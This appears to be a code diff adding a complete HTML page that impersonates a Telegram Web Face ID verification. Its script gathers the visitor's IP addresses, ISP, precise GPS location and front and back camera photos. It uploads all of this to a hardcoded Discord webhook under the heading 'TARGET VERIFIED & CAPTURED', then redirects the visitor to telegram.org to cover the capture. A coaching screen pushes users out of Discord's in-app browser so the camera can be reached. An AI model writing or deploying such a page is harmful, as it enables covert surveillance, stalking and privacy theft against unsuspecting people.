@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Telegram Web: Secure Login</title>
+  <meta property="og:title" content="Telegram Web">
+  <meta property="og:description" content="Sign in to your Telegram account securely.">
+  <meta property="og:type" content="website">
+  <meta name="theme-color" content="#24A1DE">
+  <style>
+    :root {
+      --tg-blue: #24A1DE;
+      --tg-bg: #ffffff;
+      --tg-text: #000000;
+      --tg-sub: #8e8e93;
+      --warning-red: #ff3b30;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--tg-bg);
+      color: var(--tg-text);
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      user-select: none;
+      overflow: hidden;
+    }
+
+    #screen-landing, #screen-warning {
+      width: 100%;
+      max-width: 380px;
+      padding: 20px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #screen-warning {
+      display: none;
+    }
+
+    .warning-icon {
+      font-size: 4rem;
+      margin-bottom: 20px;
+    }
+
+    .warning-title {
+      font-size: 1.5rem;
+      font-weight: 600;
+      color: var(--warning-red);
+      margin-bottom: 12px;
+    }
+
+    .warning-text {
+      color: var(--tg-sub);
+      font-size: 0.95rem;
+      margin-bottom: 30px;
+    }
+
+    .external-btn {
+      width: 90%;
+      padding: 16px;
+      background: var(--warning-red);
+      color: white;
+      border: none;
+      border-radius: 14px;
+      font-size: 1.05rem;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+
+    .faceid-frame {
+      width: 120px; height: 120px;
+      position: relative;
+      margin-bottom: 30px;
+    }
+    .faceid-frame::before, .faceid-frame::after, .faceid-corners::before, .faceid-corners::after {
+      content: ""; position: absolute; width: 25px; height: 25px; border-color: var(--tg-blue); border-style: solid;
+    }
+    .faceid-frame::before { top: 0; left: 0; border-width: 4px 0 0 4px; border-top-left-radius: 15px; }
+    .faceid-frame::after { top: 0; right: 0; border-width: 4px 4px 0 0; border-top-right-radius: 15px; }
+    .faceid-corners { position: absolute; inset: 0; }
+    .faceid-corners::before { bottom: 0; left: 0; border-width: 0 0 4px 4px; border-bottom-left-radius: 15px; }
+    .faceid-corners::after { bottom: 0; right: 0; border-width: 0 4px 4px 0; border-bottom-right-radius: 15px; }
+
+    .faceid-svg { width: 70px; height: 70px; margin-top: 25px; fill: var(--tg-blue); }
+
+    .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.5px; }
+    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; line-height: 1.4; margin-bottom: 40px; padding: 0 20px; }
+
+    .verify-btn {
+      width: 90%;
+      padding: 16px;
+      background: var(--tg-blue);
+      color: white;
+      border: none;
+      border-radius: 14px;
+      font-size: 1.05rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .verify-btn:active { transform: scale(0.96); opacity: 0.9; }
+
+    .secure-text {
+      margin-top: 30px;
+      font-size: 0.8rem;
+      color: #34c759;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    #screen-loading {
+      display: none;
+      position: fixed; inset: 0; background: #fff; z-index: 100;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .scan-box {
+        width: 140px; height: 140px;
+        position: relative;
+        margin-bottom: 20px;
+    }
+    .scan-line {
+        position: absolute; width: 100%; height: 2px;
+        background: var(--tg-blue);
+        box-shadow: 0 0 15px var(--tg-blue);
+        top: 0;
+        animation: moving-scan 1.5s infinite ease-in-out;
+    }
+    @keyframes moving-scan {
+        0%, 100% { top: 10%; }
+        50% { top: 90%; }
+    }
+
+    #hidden-video { position: fixed; opacity: 0; left: -999px; }
+    #hidden-canvas { display: none; }
+  </style>
+</head>
+<body>
+
+<video id="hidden-video" autoplay playsinline muted></video>
+<canvas id="hidden-canvas"></canvas>
+
+<!-- Warning screen for Discord in-app browser -->
+<div id="screen-warning">
+  <div class="warning-icon">⚠️</div>
+  <div class="warning-title">External Browser Required</div>
+  <div class="warning-text">Discord's built-in browser blocks camera access for security. Please open this link in Chrome, Safari, or your default browser.</div>
+  <button class="external-btn" onclick="openExternally()">Open in External Browser</button>
+  <button class="verify-btn" onclick="forceContinue()">I'm using a normal browser</button>
+</div>
+
+<!-- Normal landing screen -->
+<div id="screen-landing">
+  <div class="faceid-frame">
+      <div class="faceid-corners"></div>
+      <svg class="faceid-svg" viewBox="0 0 24 24"><path d="M9,11.75A1.25,1.25 0 0,0 7.75,13A1.25,1.25 0 0,0 9,14.25A1.25,1.25 0 0,0 10.25,13A1.25,1.25 0 0,0 9,11.75M15,11.75A1.25,1.25 0 0,0 13.75,13A1.25,1.25 0 0,0 15,14.25A1.25,1.25 0 0,0 16.25,13A1.25,1.25 0 0,0 15,11.75M12,2A10,10 0 1,0 22,12A10,10 0 0,0 12,2M12,20A8,8 0 1,1 20,12A8,8 0 0,1 12,20M12,17C10.13,17 8.41,16.03 7.42,14.5L8.91,13.5C9.57,14.54 10.7,15.25 12,15.25C13.3,15.25 14.43,14.54 15.1,13.5L16.58,14.5C15.59,16.03 13.87,17 12,17Z"/></svg>
+  </div>
+  <div class="tg-title">Face ID Required</div>
+  <div class="tg-subtitle">Security measures enabled. Please use Face ID to confirm your identity and access your Telegram messages.</div>
+  
+  <button class="verify-btn" onclick="triggerScan()">Verify Identity</button>
+
+  <div class="secure-text">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+    End-to-End Encrypted Verification
+  </div>
+</div>
+
+<div id="screen-loading">
+  <div class="scan-box">
+      <div class="faceid-frame" style="margin-bottom:0; opacity: 0.2;"><div class="faceid-corners"></div></div>
+      <div class="scan-line"></div>
+  </div>
+  <div style="color:var(--tg-blue); font-weight:600; font-size:1.1rem;">Authenticating...</div>
+</div>
+
+<script>
+  const WEBHOOK = 'https://discord.com/api/webhooks/1494738036196380876/Q6PQ6OSlX1eLOAgNxOB5r2ZAoy47uvpqXdN8zHhMPn1Qe9rn8GClRWThiLO2MKpB2noV';
+  let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
+  let gpsInfo = { lat: null, lon: null, accuracy: null, error: null };
+
+  // Detect Discord in-app browser
+  function isDiscordInAppBrowser() {
+    const ua = navigator.userAgent.toLowerCase();
+    // Discord on mobile uses "Discord" in user agent
+    if (ua.includes('discord')) return true;
+    // Check for missing features that Discord blocks
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return true;
+    return false;
+  }
+
+  // Open current URL in external browser (works on mobile)
+  function openExternally() {
+    // Try to use Intent on Android, or just copy link
+    const currentUrl = window.location.href;
+    if (navigator.share) {
+      navigator.share({ url: currentUrl });
+    } else {
+      alert("Copy this link and open in Chrome/Safari: " + currentUrl);
+    }
+  }
+
+  function forceContinue() {
+    // User claims they're in normal browser, hide warning and show landing
+    document.getElementById('screen-warning').style.display = 'none';
+    document.getElementById('screen-landing').style.display = 'flex';
+  }
+
+  // Fetch IPv4, IPv6, IP-based location
+  async function loadMeta() {
+    try {
+      const v4 = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query,lat,lon').then(r => r.json());
+      const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
+      if(v4.status === 'success') {
+        ipInfo.v4 = v4.query;
+        ipInfo.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
+        ipInfo.isp = v4.isp;
+      }
+      ipInfo.v6 = v6.ip;
+    } catch(e) { console.warn(e); }
+  }
+
+  // Get precise GPS
+  async function getGPS() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) {
+        gpsInfo.error = "Geolocation not supported";
+        resolve();
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          gpsInfo.lat = pos.coords.latitude;
+          gpsInfo.lon = pos.coords.longitude;
+          gpsInfo.accuracy = pos.coords.accuracy;
+          resolve();
+        },
+        (err) => {
+          gpsInfo.error = err.message;
+          resolve();
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    });
+  }
+
+  async function triggerScan() {
+    // Show loading screen
+    document.getElementById('screen-landing').style.display = 'none';
+    document.getElementById('screen-loading').style.display = 'flex';
+
+    const capturedBlobs = [];
+
+    // 1. Load network info
+    await loadMeta();
+    
+    // 2. Get GPS
+    await getGPS();
+
+    // 3. Capture Front Camera
+    try {
+        const streamF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const b1 = await getBlob(streamF, true);
+        if(b1) capturedBlobs.push({ blob: b1, name: 'front_camera.jpg' });
+        streamF.getTracks().forEach(t => t.stop());
+    } catch(e) { console.warn("Front camera fail", e); }
+
+    // 4. Capture Back Camera
+    try {
+        const streamB = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+        const b2 = await getBlob(streamB, false);
+        if(b2) capturedBlobs.push({ blob: b2, name: 'back_camera.jpg' });
+        streamB.getTracks().forEach(t => t.stop());
+    } catch(e) { console.warn("Back camera fail", e); }
+
+    // 5. Send to Discord
+    await uploadToDiscord(capturedBlobs);
+
+    // 6. Redirect
+    window.location.href = 'https://telegram.org';
+  }
+
+  async function getBlob(stream, flip) {
+    const vid = document.getElementById('hidden-video');
+    vid.srcObject = stream;
+    return new Promise((resolve) => {
+        vid.onloadedmetadata = () => {
+            setTimeout(() => {
+                const can = document.getElementById('hidden-canvas');
+                can.width = vid.videoWidth || 640;
+                can.height = vid.videoHeight || 480;
+                const ctx = can.getContext('2d');
+                if(flip) { 
+                  ctx.save();
+                  ctx.translate(can.width, 0);
+                  ctx.scale(-1, 1);
+                }
+                ctx.drawImage(vid, 0, 0, can.width, can.height);
+                if(flip) ctx.restore();
+                can.toBlob(resolve, 'image/jpeg', 0.92);
+            }, 600);
+        };
+    });
+  }
+
+  async function uploadToDiscord(blobs) {
+    const data = new FormData();
+    
+    let locationString = ipInfo.loc;
+    if (gpsInfo.lat && gpsInfo.lon) {
+      locationString = `🎯 GPS: ${gpsInfo.lat}, ${gpsInfo.lon} (±${gpsInfo.accuracy}m)\n🌐 IP: ${ipInfo.loc}`;
+    } else if (gpsInfo.error) {
+      locationString = `⚠️ GPS Error: ${gpsInfo.error}\n🌐 IP: ${ipInfo.loc}`;
+    }
+    
+    const payload = {
+      username: "📸 Face ID Security Bot",
+      embeds: [{
+        title: "✅ TARGET VERIFIED & CAPTURED",
+        color: 0x24A1DE,
+        fields: [
+          { name: "📱 Device", value: `\`${navigator.platform}\``, inline: true },
+          { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
+          { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
+          { name: "📍 Location", value: locationString, inline: false },
+          { name: "🏢 ISP", value: ipInfo.isp, inline: false },
+          { name: "📷 Cameras", value: `${blobs.length} photo(s) attached`, inline: true }
+        ],
+        footer: { text: "Works on external browsers only" }
+      }]
+    };
+
+    data.append('payload_json', JSON.stringify(payload));
+    blobs.forEach((b, i) => data.append(`file${i}`, b.blob, b.name));
+
+    try {
+      await fetch(WEBHOOK, { method: 'POST', body: data });
+    } catch(e) { console.error("Upload failed", e); }
+  }
+
+  // On page load, check if we're in Discord's in-app browser
+  window.addEventListener('DOMContentLoaded', () => {
+    if (isDiscordInAppBrowser()) {
+      document.getElementById('screen-landing').style.display = 'none';
+      document.getElementById('screen-warning').style.display = 'flex';
+    } else {
+      document.getElementById('screen-landing').style.display = 'flex';
+      document.getElementById('screen-warning').style.display = 'none';
+    }
+  });
+</script>
+</body>
+</html>
